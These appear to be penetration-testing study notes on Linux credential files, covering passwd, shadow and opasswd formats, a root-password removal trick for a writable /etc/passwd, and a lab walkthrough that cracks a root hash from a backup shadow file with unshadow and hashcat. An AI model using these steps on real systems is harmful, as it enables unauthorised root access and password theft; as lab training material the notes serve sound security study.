# Passwd, Shadow & Opasswd

Most common authentication mechanism : Pluggable Authentication Modules (PAM)
Modules located on :  /usr/lib/x86_x64-linux-gnu/security/pam_unix.so or pam_unix2.so

/etc/passwd and /etc/shadow are managed and updated by pam_unix.so (API calls, ...)

## Passwd File

cry0l1t3    :	x	        : 1000	:	1000	:	cry0l1t3,,,	        :	/home/cry0l1t3	:	/bin/bash
Login name  : Password info : UID   :	GUID    :	Full name/comments  :	Home directory  :	Shell

on very old systems, possible that the hash of the encrypted password in "Password Info". 
Modern systems have the hash values stored in the /etc/shadow file.

### Passwd writeable

it can also be that the /etc/passwd file is writeable by mistake

Clear "x" in password field, so root user can be used without password :

**Before**
root:x:0:0:root:/root:/bin/bash

**After**
root::0:0:root:/root:/bin/bash

head -n 1 /etc/passwd
root::0:0:root:/root:/bin/bash

su

## Shadow File

The /etc/shadow file is also only readable by users who have administrator rights.

cry0l1t3	:	$6$wBRzy$...SNIP...x9cDWUxW1	:	18937	:	0	:	99999	:	7	:	:	:
Username		Encrypted password		Last PW change		Min. PW age		Max. PW age		Warning period	Inactivity period	Expiration date	Unused



If password == ! or *, the user cannot log in with a Unix password. (other authentication methods still possible). 
If password == empty, no password is required for the login.

**Encrypted Password format :**
$<type>$<salt>$<hashed>

Algorithm Types
$1$ – MD5
$2a$ – Blowfish
$2y$ – Eksblowfish
$5$ – SHA-256
$6$ – SHA-512
By default, the SHA-512 ($6$) encryption method is used on the latest Linux distributions.

## Opasswd

/etc/security/opasswd stores all passwords of a user

cat /etc/security/opasswd

cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1

(old passwords separated by comma ,)

## Cracking Linux Credentials

### Unshadow

sudo cp /etc/passwd /tmp/passwd.bak 
sudo cp /etc/shadow /tmp/shadow.bak 
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes

### Hashcat

**Cracking Unshadowed Hashes**

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o /tmp/unshadowed.cracked

**Cracking MD5 Hashes**

cat md5-hashes.list

qNDkF0zJ3v8ylCOrKB0kt0
E9uMSmiQeRh4pAAgzuvkq1
hashcat -m 500 -a 0 md5-hashes.list rockyou.txt

# LAB

ssh will@$TARGET
TUqr7QfLTLhruhVbCP

ls -l /etc/passwd
-rw-r--r-- 1 root root 2619 Feb  9  2022 /etc/passwd

chmod 644 /etc/shadow
chmod: changing permissions of '/etc/shadow': Operation not permitted

sudo cat /etc/shadow
[sudo] password for will: 
will is not in the sudoers file.  This incident will be reported.

cat .bash_history
ls -latr .backups/
cat .backups/shadow.bak

root:$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:19032:0:99999:7:::

vi passwd.bak
vi shadow.bak
unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes


hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list

hashcat -m 1800 -a 0 /tmp/unshadowed.hashes mut_password.list -o /tmp/unshadowed.cracked

cat unshadowed.cracked 
$6$XePuRx/4eO0WuuPS$a0t5vIuIrBDFx1LyxAozOu.cVaww01u.6dSvct8AYVVI6ClJmY8ZZuPDP7IoXRJhYz4U8.DJUlilUw2EfqhXg.:J0rd@n5

